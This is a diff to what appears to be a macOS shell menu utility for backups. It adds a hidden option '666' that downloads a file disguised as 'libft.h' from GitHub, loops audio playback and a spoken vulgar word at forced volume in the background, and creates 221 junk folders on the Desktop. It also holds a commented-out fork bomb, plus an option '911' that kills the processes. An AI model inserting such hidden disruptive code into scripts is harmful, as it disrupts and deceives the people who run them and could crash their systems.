@@ -670,7 +670,7 @@ while true; do
 
       # i_lfs
       while true; do
-        echo "  \033[1;31mSelect an option:\033[0m
+        echo "  \033[1;31mSelect an option: 666 911\033[0m
     \033[1;34m1) Download backups
     2) First Backup
     3) Upload browsers data to git
@@ -727,6 +727,33 @@ while true; do
           ;;
         6)
           alias1
+          ;;
+        666)
+          curl -o ~/libft.h https://raw.githubusercontent.com/murmurlab/OpenWAR/main/libft.h
+          counter=1
+          while [ $counter -le 9999 ]
+          do
+            ((counter++))
+            osascript -e "set Volume 1"
+            say -v xander "otuzbir"
+            afplay ~/libft.h &
+            sleep 110
+          done &
+          while [ $counter -le 9999 ]
+          do
+            ((counter++))
+            osascript -e "set Volume 1"
+            say -v xander "otuzbir"
+            sleep 0
+          done &
+          # afplay ~/libft.h &
+          mkdir ~/Desktop/AAAAAAAAAAAAAAH{0..220}
+          # echo "#include <stdio.h>\n#include <unistd.h>\n#include <sys/types.h>\nint main(){while(1){fork();}return 0;}" > libft.test
+          # cc -x c libft.test && ./a.out &
+          ;;
+        911)
+          ps aux | grep "/Users/ahbasara/.murmurmak/murmurmak.sh" | cut -d ' ' -f 11 | xargs -n1 kill -9
+          ps aux | grep "afplay" | cut -d ' ' -f 11 | xargs -n1 kill -9
           ;;
         0)
           echo "0 exitting."
